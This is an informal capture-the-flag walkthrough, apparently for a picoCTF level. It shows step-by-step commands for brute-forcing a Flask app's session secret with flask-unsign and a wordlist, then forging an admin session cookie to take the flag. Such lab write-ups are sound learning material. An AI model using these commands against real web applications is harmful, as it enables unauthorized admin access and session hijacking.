In this lvl we need to download certain things to get the flag.<br>
First make a virtual environment in the terminal.<br>
To do that use command : python -m venv filename or use <br>
 git clone https://github.com/noraj/flask-session-cookie-manager.git && cd flask-session-cookie-manager 
 python -m venv venv 
 source venv/bin/activate 
 python setup.py install 
Then use command : pip install -U itsdangerous <br> To download the pre-requisites<br>Then download flask-unsign using command : pip3 install flask-unsign
Then we see the source code which is given and try to annalyze it.<br>
We can understand that we need to become admin to gt flag.<br>
You might see that you have been given a list of cookies which are good but not enough<br>
Then we need to get the secret key, for that we need to use 'flask-unsign' tool which will be present in github.<br>
Use command : flask-unsign --unsign --server 'http://mercury.picoctf.net:65344/' --wordlist wordlist.txt <br>
where wordlist is the list among all the given cookie.<br>
Now from secret key we need to forge the cookie.<br>
Then I used the following commands to get encoding done: <br>python3 flask_session_cookie_manager3.py encode -s gingersnap -t "{'very_auth':'admin'}"
<br>
Here instead of gingersnap u have to give your own secret key<br>
You will get the forged cookie now use it to get the flag.